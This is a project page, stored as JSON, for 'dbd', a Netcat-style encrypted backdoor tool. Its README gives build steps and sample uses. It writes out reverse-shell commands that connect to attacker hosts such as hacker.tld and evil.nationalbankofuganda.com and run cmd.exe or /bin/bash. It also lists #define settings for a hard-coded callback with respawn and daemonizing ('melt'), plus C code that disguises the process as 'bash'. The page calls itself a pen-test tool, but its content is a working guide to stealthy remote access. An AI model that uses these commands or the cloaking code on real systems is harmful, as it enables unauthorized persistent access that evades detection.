{"google":"","body":"                          d8888b. d8888b. d8888b.\r\n                          88  `8D 88  `8D 88  `8D\r\n                          88   88 88oooY' 88   88\r\n                          88   88 88~~~b. 88   88\r\n                          88  .8D 88   8D 88  .8D\r\n                          Y8888D' Y8888P' Y8888D'\r\n\r\n#Durandal's Backdoor\r\n##Copyright (C) 2012 Kyle Barnthouse <[durandal@gitbrew.org](mailto:durandal@gitbrew.org)>\r\n##dbd is distributed under the GNU GPL\r\n\r\n\r\n###SYNOPSIS\r\ndbd is a Netcat-clone, designed to be portable and offer strong encryption. It\r\nruns on Unix-like operating systems and on Microsoft Win32. dbd features\r\nAES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution\r\n(-e option), choosing source port, continuous reconnection with delay, and\r\nsome other nice features. dbd supports TCP/IP communication only. Source code\r\nand binaries are distributed under the GNU General Public License.\r\n\r\n###COMPILATION\r\nTo compile dbd under a Unix-like operating system you need gcc and relevant\r\ndevelopment tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others),\r\ntype:\r\n\t\t$ make unix\r\n\r\nFor SunOS/Solaris, type:\r\n\r\n\t\t$ make sunos\r\n\r\nTo compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or\r\nCygwin with full development support (Cygwin's MinGW gcc). To compile a native\r\nWin32 dbd console application under Cygwin, type:\r\n\r\n\t\t$ make win32\r\n\r\nor, under MSYS:\r\n\r\n\t\t$ make mingw\r\n\r\nTo compile a no-console (\"WinMain\") application under Cygwin, type:\r\n\r\n\t\t$ make win32bg\r\n\r\nor, under MSYS:\r\n\r\n\t\t$ make mingwbg\r\n\r\nTo compile a Cygwin-specific console application, type:\r\n\r\n\t\t$ make cygwin\r\n\r\n\r\nYou may want to change the default behaviour of dbd. One of the most important\r\nthing is to change the default shared secret to your own pass phrase. Edit\r\ndbd.h and replace with your preferences. You may, for example, want to\r\nhardcode a host + port to connect to if dbd is started without options.\r\nComplete examples are provided in dbd.h.\r\n\r\n\r\n###SAMPLE USES\r\nWith a little imagination, dbd can be used for many things...\r\n\r\n    * Use dbd to securely transfer files between two networks:\r\n\r\n\t\tsnafu$ dbd -l -p 12345 -k secret > output.file\r\n\r\n\t\tfubar$ cat input.file | dbd -k secret snafu 12345\r\n\r\nor from win32:\r\n\t\tC:\\somedir>type input.fil | dbd -k secret snafu 12345\r\n\r\n    * Use dbd as a simple (but secure) chat:\r\n\r\n\t\tsnafu$ dbd -P snafu -Hon fubar 1234\r\n\r\n\t\tfubar$ dbd -Pfubar -Hon -l -p 1234\r\n\r\n    * Use dbd as a pen-test backdoor:\r\n\r\n\t\tC:\\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443\r\n\t\t...\r\n\r\nor under Unix-like OSes:\r\n\r\n\t\troot@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993\r\n\r\n###HARD CODING OPTIONS\r\nIn addition to using command line options, you can hard code variables by using\r\n#defines in dbd.h.  To do this, set the variables you wish to use as named \r\nconstants and compile as normal.  For example, if you wanted to hard code a dbd\r\nexecutable that connected back to \"evil.nationalbankofuganda.com\" on port 995,\r\nand executed \"/bin/bash\" you could run:\r\n\r\n\t\troot@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995\r\n\r\nor using hard-coded #defines, you could edit dbd.h:\r\n\r\n\t\t#define DOLISTEN 0\r\n\t\t#define HOST \"evil.nationalbankofuganda.com\"\r\n\t\t#define PORT 995\r\n\t\t#define EXECPROG \"/bin/bash\"\r\n\r\nYou can also set respawn and stealth options to help maintain your connection:\r\n\r\n\t\t#define RESPAWN_ENABLED 1\r\n\t\t#define RESPAWN_INTERVAL 900\r\n\t\t#define QUIET 1\r\n\t\t#define DAEMONIZE 1\r\n\t\t\r\nThis will set the connection to daemonize (\"melt\" in malware terms), never send\r\noutput to STDOUT, and attempt to respawn the connection every 15 minutes should\r\nit ever disconnect from the listener.\r\n\r\n###ROMULAN CLOAKING TECHNOLOGY\r\n\r\nNow we're getting into the fun stuff.  Once you are a mastar at hard-coding\r\noptions into your backdoor, you can use what is quite possibly the most fun\r\nnamed constant at our disposal: CLOAK.  To do this, simply set the value:\r\n\r\n\t\t#define CLOAK 1\r\n\r\nNOTE: this currently only works on *nix compiles.  Eventually I plan on adding\r\nWin32 process migration/hooking so those targets can feel some Romulan love as\r\nwell.\r\n\r\nFor *nix environments, this option scrubs argv[0] and replaces it with the\r\nstring \"bash\\0\".  It also scrubs all other argv[]'s (it'd look silly if ps\r\nreturned \"bash -e /bin/bash someremotehost.com 443\" now wouldn't it?)  I hope\r\nit goes without saying that you CANNOT USE THIS OPTION UNLESS YOU ARE HARD\r\nCODING YOUR VARIABLES INTO DBD.H.  Also, if you're testing this on your own\r\nsystem it's gonna be fun picking the right pid to kill. ;)\r\n\r\nFeel free to use this scrubber in anything you happen to be working on:\r\n\r\n\t\t//grab our named constant\r\n\t\tint cloak = CLOAK;\r\n\r\n\t\t//Engage cloaking device\r\n\t\tif(cloak)\r\n\t\t{\r\n\t\t\t#ifdef WIN32\r\n\t\t\t//stub              \r\n\t\t\t#else\r\n\t\t\t//change argv[0] to say bash       \r\n\t\t\tint scrub;\r\n\t\t\tstrncpy((char *)argv[0], \"\\0\", strlen((char *)argv[0]) + 1);\r\n\t\t\tstrcpy((char *)argv[0], \"bash\\0\");    \r\n\t\t\tfor (scrub = 1; scrub < argc; scrub++)\r\n\t\t\t{                     \r\n\t\t\t\t strncpy((char *)argv[scrub], \"\\0\", strlen((char *)argv[scrub]) + 1);\r\n\t\t\t}                 \r\n\t\t\t#endif\r\n\t\t}\r\n\t\t\r\n\t\r\n\r\n###WARNING\r\nDo not pass cached input (a file with commands or similar) to a listening \"dbd\r\n-e\" session. \"dbd -e\" is using pipes to pass data between the program being\r\nexecuted and dbd. Pipes are used (instead of plain pass-through duplicate file\r\ndescriptors) because of encryption between the pipes and the socket. In order\r\nto prevent the writing end of one of the pipes from blocking the whole\r\nprocess, I turned it into a non-blocking descriptor. There is a chance that\r\nwhen passing too much input at a time through to the -e program, it will be\r\ntruncated (cut off) since the pipe buffer (in the OS) can't hold all of the\r\ndata. This problem can be solved by making dbd multi-threaded for instance,\r\nbut I'll avoid this as long as possible for compatibility reasons.\r\n\r\n\r\n###LICENSE\r\ndbd Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>\r\n\r\nThis program is free software; you can redistribute it and/or modify it under\r\nthe terms of the GNU General Public License as published by the Free Software\r\nFoundation; either version 2 of the License, or (at your option) any later\r\nversion.\r\n\r\nThis program is distributed in the hope that it will be useful, but WITHOUT\r\nANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\r\nFOR A PARTICULAR PURPOSE.  See the GNU General Public License for more\r\ndetails.\r\n\r\nYou should have received a copy of the GNU General Public License along with\r\nthis program; if not, write to the Free Software Foundation, Inc., 59 Temple\r\nPlace, Suite 330, Boston, MA  02111-1307  USA\r\n\r\nSee the COPYING file for more information.\r\n\r\n---\r\n\r\ndbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe\r\nDevine <devine@cr0.net> and is distributed under the GNU General Public\r\nLicense (GPL).\r\n\r\nSome code (for doexec_win32.h) has been derived from doexec.c from the Win32\r\nport of Netcat (C) Weld Pond and *hobbit*. Parts of doexec.c is Copyright (C)\r\n1994 Nathaniel W. Mishkin (doexec.c code was originally derived from\r\nrlogind.exe).\r\n\r\nThe original version of Netcat was written by *hobbit* <hobbit@avian.org>. The\r\nNT version was done by Weld Pond <weld@l0pht.com>.\r\n\r\n---\r\nKyle Barnthouse <[durandal@gitbrew.org](mailto:durandal@gitbrew.org)>\r\nSecurity Consultant\r\n[gitbrew.org](http://gitbrew.org)\r\n[Hephaestus Security](http://hephaestussec.com)","tagline":"Durandal's Backdoor","note":"Don't delete this file! It's used internally to help with page regeneration.","name":"Dbd"}